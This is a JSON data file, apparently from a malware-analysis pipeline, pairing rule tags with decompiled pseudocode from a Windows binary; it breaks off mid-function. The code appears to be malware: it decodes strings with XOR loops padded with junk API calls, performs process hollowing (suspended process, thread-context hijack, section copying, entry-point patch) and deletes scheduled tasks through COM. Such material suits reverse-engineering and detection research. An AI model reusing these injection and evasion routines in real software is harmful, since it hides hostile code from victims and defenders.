{
    "00401000": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00401000(char *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    // [00] -r-x section size 61440 named .text\n    uVar3 = 0xffffffff;\n    if (param_2 != 0) {\n        do {\n            uVar4 = *param_1;\n            param_2 = param_2 + -1;\n            param_1 = param_1 + 1;\n            iVar2 = 8;\n            do {\n                uVar1 = uVar4 ^ uVar3;\n                uVar3 = uVar3 >> 1;\n                if ((uVar1 & 1) != 0) {\n                    uVar3 = uVar3 ^ 0xedb88320;\n                }\n                uVar4 = uVar4 >> 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        } while (param_2 != 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 252
    },
    "00401cfc": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00401cfc(uint32_t arg_8h, uint arg_ch, int16_t **arg_10h, int32_t *arg_14h)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int16_t *piVar9;\n    uint32_t uVar10;\n    uint32_t in_EDX;\n    code *pcVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int16_t *var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint16_t *var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t lpBuffer;\n    int32_t lpFindFileData;\n    int16_t *lpMem;\n    int32_t var_4h;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0;\n    var_20h = 0;\n    var_4h = 0;\n    var_1ch = in_EDX;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x250);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    if (iVar5 == 0) {\n        return var_20h;\n    }\n    lpFindFileData = iVar5;\n    uVar4 = (*pcVar11)(8, 0x208);\n    lpBuffer = (*pcVar3)(uVar4);\n    if (lpBuffer == 0) goto code_r0x00401fc1;\n    uVar4 = (*pcVar11)(8, 0x208);\n    lpMem = (*pcVar3)(uVar4);\n    if (lpMem != NULL) {\n        var_48h = 0x6b5d312c;\n        var_44h = 0x77547077;\n        var_40h = 0x31155913;\n        piVar6 = lpMem;\n        for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *piVar6 = 0;\n            piVar6 = piVar6 + 1;\n        }\n        var_3ch._0_2_ = 0x6b77;\n        var_34h = 0x6b773170;\n        var_30h._0_1_ = 0x59;\n        uVar4 = (*pcVar11)(8, 0x1d);\n        piVar6 = (*pcVar3)(uVar4);\n        iVar5 = 0;\n        var_38h = piVar6;\n        do {\n            iVar7 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n            iVar12 = lpBuffer;\n            if (iVar7 != 0xdf69c8) {\n                var_18h = 5;\n                *(iVar5 + piVar6) = *(&var_34h + iVar5 % 5) ^ (iVar5 + piVar6)[&var_48h - piVar6];\n            }\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0xe);\n        piVar9 = piVar6;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != 0);\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(lpBuffer, 0x103 - (piVar9 - (piVar6 + 1) >> 1));\n        if (iVar5 == 0) {\ncode_r0x00401f93:\n            uVar4 = (*pcVar11)(0, lpMem);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        else {\n            if (var_14h == 0) {\n                var_1ch = fcn.0040eefc();\n                var_1ch = var_1ch & 0xff;\n                arg_8h = fcn.0040eefc();\n                arg_8h = arg_8h & 0xff;\n            }\n            var_14h = arg_8h;\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar12, piVar6);\n            var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar12, lpFindFileData);\n            if (var_18h == -1) goto code_r0x00401f93;\n            iVar5 = lpFindFileData;\n            iVar12 = lpBuffer;\n            for (uVar13 = 0; (uVar13 <= var_1ch || (uVar13 <= var_14h)); uVar13 = uVar13 + 1) {\n                if ((uVar13 == var_1ch) || (uVar13 == var_14h)) {\n                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrRChrW)(iVar5 + 0x2c, 0, 0x2e);\n                    var_34h = (iVar7 + (-0x2c - iVar5) >> 1) >> 1;\n                    var_20h = 0;\n                    if ((var_4h != 0) && (var_20h = var_34h - 4,  var_34h < var_20h)) {\n                        var_20h = 0;\n                    }\n                    if (4 < var_34h) {\n                        var_34h = 4;\n                    }\n                    piVar6 = lpMem;\n                    do {\n                        iVar1 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                    } while (iVar1 != var_24h);\n                    for (piVar6 = lpMem + (piVar6 - (lpMem + 1) >> 1); *piVar6 != 0; piVar6 = piVar6 + 1) {\n                    }\n                    var_28h = iVar5 + (var_20h + 0x16) * 2;\n                    var_20h = *var_28h;\n                    if (*var_28h != 0) {\n                        iVar7 = var_28h - piVar6;\n                        uVar8 = var_20h;\n                        uVar10 = var_34h;\n                        do {\n                            iVar5 = lpFindFileData;\n                            iVar12 = lpBuffer;\n                            if (uVar10 == 0) break;\n                            *piVar6 = uVar8;\n                            piVar6 = piVar6 + 1;\n                            uVar10 = uVar10 - 1;\n                            uVar2 = *(iVar7 + piVar6);\n                            uVar8 = uVar2;\n                        } while (uVar2 != 0);\n                    }\n                    var_4h = var_4h + var_34h;\n                    *piVar6 = 0;\n                    var_2ch = var_34h;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(var_18h, iVar5);\n                if (iVar7 == 0) {\n                    var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar12, iVar5);\n                }\n            }\n            *arg_10h = lpMem;\n            var_20h = 1;\n            lpMem[var_4h] = 0;\n            *arg_14h = var_4h;\n            (*_sym.imp.KERNEL32.dll_FindClose)(var_18h);\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            piVar6 = var_38h;\n        }\n        uVar4 = (*pcVar11)(0, piVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        iVar5 = lpFindFileData;\n    }\n    uVar4 = (*pcVar11)(0, lpBuffer);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\ncode_r0x00401fc1:\n    uVar4 = (*pcVar11)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return var_20h;\n}\n",
        "token_count": 1977
    },
    "00404392": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00404392(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint32_t in_EDX;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uchar *puVar11;\n    int32_t *piVar12;\n    uchar *puVar13;\n    int32_t iVar14;\n    uchar *puVar15;\n    int32_t *piStack1016;\n    uchar *puStack1012;\n    uint uStack1008;\n    int32_t *piStack1004;\n    uint uStack1000;\n    uchar *puStack996;\n    uchar *puStack992;\n    uchar *puStack988;\n    uint uStack984;\n    uchar *puStack980;\n    uchar *puStack976;\n    uint uStack972;\n    uint uStack968;\n    uint uStack964;\n    uint uStack960;\n    uint uStack956;\n    uint uStack952;\n    uint uStack948;\n    int32_t iStack928;\n    uint32_t uStack924;\n    int32_t iStack920;\n    uchar *puStack916;\n    uint uStack912;\n    uint uStack908;\n    uchar *puStack904;\n    uint uStack900;\n    uint32_t uStack896;\n    int32_t iStack892;\n    uint uStack888;\n    uint uStack884;\n    uint uStack880;\n    uint uStack876;\n    uint uStack872;\n    uint uStack868;\n    uint uStack864;\n    int32_t iStack860;\n    ushort uStack856;\n    uint uStack852;\n    uint uStack844;\n    uchar auStack840 [28];\n    uint uStack812;\n    uint uStack804;\n    uchar auStack740 [88];\n    int32_t iStack652;\n    int32_t iStack636;\n    \n    uStack948 = 0x208;\n    uStack952 = 8;\n    uStack956 = 0x4043b6;\n    uStack924 = in_EDX;\n    uStack956 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    uStack960 = 0x4043bf;\n    puStack904 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    uStack900 = 0x78113173;\n    uStack852 = 0;\n    iStack928 = 0;\n    uStack924 = uStack924 & 0xffffff00;\n    iStack920 = 0;\n    uStack908 = 0;\n    uStack844 = 0;\n    puVar11 = &stack0xfffffcd4;\n    for (iVar9 = 0x44; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    uStack812 = 0x44;\n    puVar11 = &stack0xfffffcb8;\n    for (iVar9 = 0x10; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    uStack896 = 0x3125664a;\n    iStack892 = 0x66567836;\n    puVar11 = &stack0xfffffd1c;\n    for (iVar9 = 0x2cc; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    uStack960 = 0x5d;\n    uStack888 = 0x7810313b;\n    uStack884 = 0x3139665c;\n    puVar11 = puStack904;\n    for (iVar9 = 0x208; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    uStack964 = 8;\n    uStack880 = 0x66167836;\n    uStack876 = 0x7811310a;\n    uStack872 = 0x3125664a;\n    uStack868 = 0x66567836;\n    uStack864 = 0x7871313b;\n    iStack860 = 0x310a6601;\n    uStack856 = 0x7842;\n    puStack916 = 0x78423156;\n    uStack912 = CONCAT22(uStack912._2_2_, 0x6633);\n    uStack968 = 0x40448e;\n    uStack968 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack972 = 0x404491;\n    iVar9 = (*pcVar4)();\n    iVar14 = 0;\n    iStack860 = iVar9;\n    do {\n        uStack972 = 0x4044a7;\n        iVar5 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        puVar11 = puStack916;\n        if (iVar5 != 0xf4e91b) {\n            uStack956 = 6;\n            *(iVar14 + iVar9) = (&stack0xfffffc60)[iVar14 % 6] ^ (iVar14 + iVar9)[&stack0xfffffc70 + -iVar9];\n        }\n        iVar14 = iVar14 + 1;\n    } while (iVar14 < 0x2e);\n    uStack972 = 0x104;\n    puStack976 = puStack916;\n    uStack984 = 0x4044e0;\n    puStack980 = iVar9;\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)();\n    pcVar4 = _sym.imp.KERNEL32.dll_lstrcatW;\n    uStack984 = uStack960;\n    puStack988 = puVar11;\n    puStack992 = 0x4044ed;\n    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n    puStack992 = 0x4103a4;\n    puStack996 = puVar11;\n    uStack1000 = 0x4044f5;\n    (*pcVar4)();\n    uStack1000 = arg_8h;\n    piStack1004 = puVar11;\n    uStack1008 = 0x4044fb;\n    (*pcVar4)();\n    uStack1008 = 0x4103ac;\n    puStack1012 = puVar11;\n    piStack1016 = 0x404503;\n    (*pcVar4)();\n    pcVar4 = _sym.imp.KERNEL32.dll_CreateProcessW;\n    while( true ) {\n        piStack1016 = &stack0xfffffc80;\n        iVar14 = (*pcVar4)(0, puVar11, 0, 0, 0, 0x800000c, 0, 0, &stack0xfffffc9c);\n        if (iVar14 != 0) break;\n        puStack1012 = 0x3e8;\n        piStack1016 = 0x404516;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    puStack1012 = puVar11;\n    piStack1016 = NULL;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uStack804 = 0x10002;\n    puVar11 = piStack1004 + *(piStack1004 + 0x3c);\n    puStack980 = puVar11;\n    iVar14 = (*_sym.imp.KERNEL32.dll_GetThreadContext)(uStack900, &stack0xfffffcdc);\n    if (iVar14 != 0) {\n        piStack1016 = *(puVar11 + 0x50);\n        iVar14 = fcn.0040f2b5(&stack0xfffffc2c);\n        if ((iVar14 == 0) && (iVar14 = fcn.0040f017(&stack0xfffffc64),  iVar14 == 0)) {\n            puVar13 = puStack992;\n            if (puStack992 != NULL) {\n                for (; piStack1016 != NULL; piStack1016 = piStack1016 + -1) {\n                    *puVar13 = 0;\n                    puVar13 = puVar13 + 1;\n                }\n                puVar13 = puStack1012;\n                puVar15 = puStack992;\n                for (iVar9 = *(puVar11 + 0x54); iVar9 != 0; iVar9 = iVar9 + -1) {\n                    *puVar15 = *puVar13;\n                    puVar13 = puVar13 + 1;\n                    puVar15 = puVar15 + 1;\n                }\n                uStack1008 = 0;\n                if (*(puVar11 + 6) != 0) {\n                    piStack1004 = puVar11 + *(puVar11 + 0x14) + 0x24;\n                    do {\n                        iVar9 = piStack1004[1];\n                        if (iVar9 != 0) {\n                            puVar13 = puStack1012 + *piStack1004;\n                            puVar15 = puStack992 + *piStack1004;\n                            for (; iVar9 != 0; iVar9 = iVar9 + -1) {\n                                *puVar15 = *puVar13;\n                                puVar13 = puVar13 + 1;\n                                puVar15 = puVar15 + 1;\n                            }\n                        }\n                        piStack1004 = piStack1004 + 10;\n                        uStack1008 = uStack1008 + 1;\n                    } while (uStack1008 < *(puVar11 + 6));\n                }\n                iVar9 = 0xa0;\n                if (*(puVar11 + 4) == -0x799c) {\n                    iVar9 = 0xb0;\n                }\n                piStack1004 = uStack924 - *(puVar11 + 0x34);\n                uStack896 = uStack924 - *(puVar11 + 0x34);\n                iStack892 = (uStack924 >> 0x1f) - (uStack924 < *(puVar11 + 0x34));\n                piStack1016 = puStack1012 + *(puVar11 + iVar9);\n                if ((*(puVar11 + iVar9) != 0) && (puStack976 = *(puVar11 + iVar9 + 4),  puStack976 != NULL)) {\n                    for (; 0x8 < puStack976; puStack976 = puStack976 + -*piVar12) {\n                        uStack1008 = piStack1016[1] - 8U >> 1;\n                        iVar9 = *piStack1016;\n                        if ((piStack1016[1] <= puStack976) && (uStack1008 != 0)) {\n                            piVar12 = piStack1016 + 2;\n                            uVar10 = uStack1008;\n                            do {\n                                uVar2 = *piVar12;\n                                puStack1012 = uVar2 >> 0xc;\n                                if (puStack1012 == 0x3) {\n                                    *(puStack992 + (uVar2 & 0xfff) + iVar9) =\n                                         piStack1004 + *(puStack992 + (uVar2 & 0xfff) + iVar9);\n                                }\n                                else if (puStack1012 == 0xa) {\n                                    uVar7 = uVar2 & 0xfff;\n                                    puVar1 = puStack992 + uVar7 + iVar9;\n                                    uVar3 = *puVar1;\n                                    *puVar1 = *puVar1 + uStack896;\n                                    *(puStack992 + uVar7 + 4 + iVar9) =\n                                         *(puStack992 + uVar7 + 4 + iVar9) + iStack892 + CARRY4(uVar3, uStack896);\n                                }\n                                piVar12 = piVar12 + 2;\n                                uVar10 = uVar10 - 1;\n                            } while (uVar10 != 0);\n                        }\n                        piVar12 = piStack1016 + 1;\n                        piStack1016 = piStack1016 + piStack1016[1];\n                        puVar11 = puStack988;\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n                iVar5 = *(puVar11 + 0x28) + iStack928;\n                iVar14 = (*_sym.imp.KERNEL32.dll_ReadProcessMemory)(puStack916, iStack652 + 8, &stack0xfffffc84, 4, 0);\n                pcVar4 = _sym.imp.KERNEL32.dll_IsBadReadPtr;\n                iVar9 = iStack920;\n                if (iVar14 != 0) {\n                    iVar9 = (*_sym.imp.KERNEL32.dll_IsBadReadPtr)(&stack0xfffffc18, 1);\n                    if (iVar9 == 0) {\n                        uStack1008._0_1_ = 0xe9;\n                    }\n                    uStack1008 = uStack1008 & 0xffffff00 | uStack1008;\n                    iVar14 = (*pcVar4)(&stack0xfffffc11, 4);\n                    iVar9 = iStack928;\n                    if (iVar14 == 0) {\n                        uVar10 = (iVar5 - iStack636) - 5;\n                        piStack1016 = piStack1016 & 0xff | uVar10 * 0x100;\n                        puStack1012 = puStack1012 & 0xffffff00 | uVar10 >> 0x18;\n                    }\n                    iVar14 = 0;\n                    do {\n                        iVar5 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)\n                                          (iVar9, iVar14 + iStack652, &stack0xfffffc08 + iVar14, 1, 0);\n                        if (iVar5 == 0) break;\n                        iVar14 = iVar14 + 1;\n                    } while (iVar14 < 5);\n                    (*_sym.imp.KERNEL32.dll_ResumeThread)(uStack924);\n                    puStack916 = 0x1;\n                    iVar9 = iStack920;\n                }\n                goto code_r0x004047e6;\n            }\n        }\n        else {\ncode_r0x004047e6:\n            if (puStack992 != NULL) {\n                fcn.0040f173();\n            }\n        }\n        if (puStack980 != NULL) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(puStack980);\n        }\n        if (puStack916 != NULL) goto code_r0x0040482d;\n    }\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uStack912, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack920);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack920);\ncode_r0x0040482d:\n    uVar6 = uStack912;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    return uVar6;\n}\n",
        "token_count": 3391
    },
    "00404a74": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404a74(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    int16_t *piVar9;\n    uint lpFileName;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *ppv;\n    int32_t var_10h;\n    int16_t *var_ch;\n    int32_t pszFirst;\n    uint var_4h;\n    \n    var_30h = 0x331e313d;\n    var_34h = 0;\n    var_20h = NULL;\n    ppv = NULL;\n    var_18h = NULL;\n    var_1ch = 0;\n    var_10h = 0;\n    var_2ch = 0x7213591e;\n    var_28h = 0x3159721f;\n    pszFirst = 0x33723159;\n    var_4h._0_1_ = 0x72;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar7 = 0;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar6 != 0x29cda) {\n            var_24h = 5;\n            *(iVar7 + piVar5) = *(&pszFirst + iVar7 % 5) ^ (iVar7 + piVar5)[&var_30h - piVar5];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xc);\n    iVar7 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar7) {\n        iVar7 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x410380, 0, 1, 0x410370, &ppv);\n        if ((-1 < iVar7) && (ppv != NULL)) {\n            iVar7 = (**(*ppv + 0x14))(ppv, &var_20h);\n            if ((-1 < iVar7) && (var_20h != NULL)) {\n                iVar7 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                pcVar2 = _sym.imp.ole32.dll_CoTaskMemFree;\n                while ((-1 < iVar7 && (var_10h != 0))) {\n                    do {\n                        var_10h = var_10h + -1;\n                        uVar4 = *(var_1ch + var_10h * 4);\n                        var_24h = uVar4;\n                        iVar7 = (**(*ppv + 0x18))(ppv, uVar4, 0x410390, &var_18h);\n                        if ((-1 < iVar7) && (var_18h != NULL)) {\n                            pszFirst = 0;\n                            var_ch = NULL;\n                            iVar7 = (**(*var_18h + 0x84))(var_18h, &pszFirst);\n                            if ((-1 < iVar7) && (pszFirst != 0)) {\n                                iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, *0x41cb38);\n                                if ((iVar7 != 0) &&\n                                   ((iVar7 = (**(*var_18h + 0x8c))(var_18h, &var_ch),  -1 < iVar7 && (var_ch != NULL))))\n                                {\n                                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(var_ch, piVar5);\n                                    piVar3 = var_ch;\n                                    if ((iVar7 != 0) &&\n                                       (((*var_ch == 0x22 && (var_ch[2] == 0x3a)) && (var_ch[3] == 0x5c)))) {\n                                        puVar8 = &lpFileName;\n                                        for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n                                            *puVar8 = 0;\n                                            puVar8 = puVar8 + 1;\n                                        }\n                                        piVar9 = piVar5;\n                                        do {\n                                            iVar1 = *piVar9;\n                                            piVar9 = piVar9 + 1;\n                                        } while (iVar1 != var_34h);\n                                        iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(piVar3, piVar5);\n                                        (*_sym.imp.SHLWAPI.dll_StrCpyNW)\n                                                  (&lpFileName, var_ch + 1, \n                                                   ((iVar7 - var_ch >> 1) - 2) + (piVar9 - (piVar5 + 1) >> 1));\n                                        iVar7 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(&lpFileName);\n                                        uVar4 = var_24h;\n                                        if (iVar7 == -1) {\n                                            (**(*ppv + 0x1c))(ppv, var_24h);\n                                        }\n                                    }\n                                    (*pcVar2)(var_ch);\n                                }\n                                (*pcVar2)(pszFirst);\n                            }\n                            (**(*var_18h + 8))(var_18h);\n                        }\n                        (*pcVar2)(uVar4);\n                    } while (var_10h != 0);\n                    (*pcVar2)(var_1ch);\n                    iVar7 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                }\n                (**(*var_20h + 8))(var_20h);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return;\n}\n",
        "token_count": 1429
    },
    "0040d61b": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040d61b(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uchar *arg_8h_00;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    int32_t *in_EDX;\n    code *pcVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    int32_t *piVar13;\n    uint var_a8h;\n    uint var_a0h;\n    int32_t var_78h;\n    int32_t var_74h;\n    uint32_t var_70h;\n    int32_t *var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    ushort var_20h;\n    uchar var_1eh;\n    uint var_1dh;\n    uint var_16h;\n    uchar *var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_64h = 0;\n    var_58h = 0;\n    var_50h = 0;\n    var_48h = 0xa15231f;\n    var_44h = 0x1d335f23;\n    var_40h._0_2_ = 0x4f0a;\n    var_8h = 0x66715771;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x4f);\n    var_6ch = in_EDX;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_10h = 0x5;\n    iVar11 = 0;\n    var_5ch = &var_48h - iVar4;\n    var_60h = iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar5 != 0x7b0fea) {\n            *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_10h) ^ (iVar11 + iVar4)[var_5ch];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 10);\n    var_1dh._0_1_ = 5;\n    var_34h = 0x361f1e1d;\n    var_30h = 0x3873631a;\n    var_2ch = 0x2c1f3c3d;\n    var_28h = 0x362e070e;\n    var_24h = 0x1d26381f;\n    var_20h = 0x3621;\n    var_1eh = 3;\n    var_1dh._1_1_ = 0x35;\n    var_ch = 0x6;\n    var_1dh._2_1_ = 6;\n    stack0xffffffe2 = 0x261e3c2b;\n    var_16h._0_2_ = 0x5d71;\n    var_16h._2_1_ = 0x48;\n    var_8h = 0x59486947;\n    var_4h._0_2_ = 0x556d;\n    uVar3 = (*pcVar10)(8, 0x22);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar11 = 0;\n    var_10h = &var_34h - iVar4;\n    var_5ch = iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        iVar5 = var_60h;\n        if (iVar6 != 0x85a1e4) {\n            *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ var_10h[iVar11 + iVar4];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x21);\n    if ((*0x41d228 & 1) == 0) {\n        *0x41d228 = *0x41d228 | 1;\n        *0x41d224 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_60h);\n    }\n    if ((*0x41d228 & 2) == 0) {\n        *0x41d228 = *0x41d228 | 2;\n        *0x41d220 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41d224, iVar4);\n    }\n    if (*0x41d224 == 0) {\n        *0x41d224 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5);\n    }\n    if (*0x41d220 == NULL) {\n        var_1dh._0_1_ = 5;\n        var_34h = 0x361f1e1d;\n        var_30h = 0x3873631a;\n        var_2ch = 0x2c1f3c3d;\n        var_28h = 0x362e070e;\n        var_24h = 0x1d26381f;\n        var_20h = 0x3621;\n        var_1eh = 3;\n        var_1dh._1_1_ = 0x35;\n        var_1dh._2_1_ = 6;\n        stack0xffffffe2 = 0x261e3c2b;\n        var_16h._0_2_ = 0x5d71;\n        var_16h._2_1_ = 0x48;\n        var_8h = 0x59486947;\n        var_4h._0_2_ = 0x556d;\n        uVar3 = (*pcVar10)(8, 0x22);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar11 = 0;\n        var_10h = &var_34h - iVar4;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n            if (iVar5 != 0x85a1e4) {\n                *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ var_10h[iVar11 + iVar4];\n            }\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 0x21);\n        *0x41d220 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41d224, iVar4);\n        uVar3 = (*pcVar10)(0, iVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        iVar5 = var_60h;\n        iVar4 = var_5ch;\n    }\n    fcn.0040cee9();\n    if ((*0x41d220 != NULL) && (iVar11 = (**0x41d220)(var_4ch, 0, &var_a8h, 0x30, &var_54h),  -1 < iVar11)) {\n        uVar3 = (*pcVar10)(8, 0x200);\n        var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (var_10h != NULL) {\n            uVar3 = (*pcVar10)(8, 0x100);\n            iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            if (((iVar11 != 0) && (var_54h = fcn.0040d46a(iVar11, 0x28),  var_54h != 0)) &&\n               (var_54h = fcn.0040d46a(iVar11 + 0x28, 0x40),  arg_8h_00 = var_10h,  var_54h != 0)) {\n                var_44h = *(iVar11 + 0x3c);\n                var_68h = *(iVar11 + 0x18) + 0x10;\n                var_8h = *(iVar11 + 0x1c) + (0xffffffef < *(iVar11 + 0x18));\n                var_ch = var_6ch + 2;\n                var_48h = *(iVar11 